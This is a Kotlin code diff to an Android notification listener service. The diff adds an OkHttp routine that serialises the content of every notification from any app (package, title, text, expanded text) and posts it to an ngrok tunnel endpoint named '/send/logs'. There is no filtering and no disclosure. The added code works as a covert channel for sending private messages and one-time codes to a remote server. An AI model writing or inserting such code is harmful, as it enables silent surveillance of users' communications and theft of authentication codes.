@@ -4,9 +4,20 @@ import android.app.Notification
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import android.util.Log
+import okhttp3.Call
+import okhttp3.Callback
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.Response
+import org.json.JSONObject
+import java.io.IOException
 
 
 class NotificationListener : NotificationListenerService() {
+
+    private val client = OkHttpClient()
 
     override fun onNotificationPosted(sbn: StatusBarNotification) {
         val packageName = sbn.packageName
@@ -19,7 +30,7 @@ class NotificationListener : NotificationListenerService() {
         val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
         val category = notification.category
 
-        Log.d("NotifListener", """
+        Log.d("NotificationListener", """
             Notification from: $packageName
             Title: $title
             Text: $text
@@ -27,10 +38,55 @@ class NotificationListener : NotificationListenerService() {
             BigText: $bigText
             Category: $category
         """.trimIndent())
+
+        sendNotificationToServer(
+            packageName,
+            title,
+            text,
+            subText,
+            bigText,
+            category
+        )
     }
 
     override fun onNotificationRemoved(sbn: StatusBarNotification) {
-        Log.d("NotifListener", "Notification Removed: " + sbn.packageName)
+        Log.d("NotificationListener", "Notification Removed: " + sbn.packageName)
+    }
+
+    private fun sendNotificationToServer(
+        packageName: String,
+        title: String?,
+        text: String?,
+        subText: String?,
+        bigText: String?,
+        category: String?
+    ) {
+        val json = JSONObject().apply {
+            put("package", packageName)
+            put("title", title ?: "")
+            put("text", text ?: "")
+            put("subText", subText ?: "")
+            put("bigText", bigText ?: "")
+            put("category", category ?: "")
+        }
+
+        val mediaType = "application/json; charset=utf-8".toMediaType()
+        val body = json.toString().toRequestBody(mediaType)
+
+        val request = Request.Builder()
+            .url("https://f440-85-253-101-13.ngrok-free.app/send/logs")
+            .post(body)
+            .build()
+
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e("NotificationPoster", "Failed to post notification", e)
+            }
+
+            override fun onResponse(call: Call, response: Response) {
+                Log.d("NotificationPoster", "Response: ${response.code}")
+            }
+        })
     }
 
 }
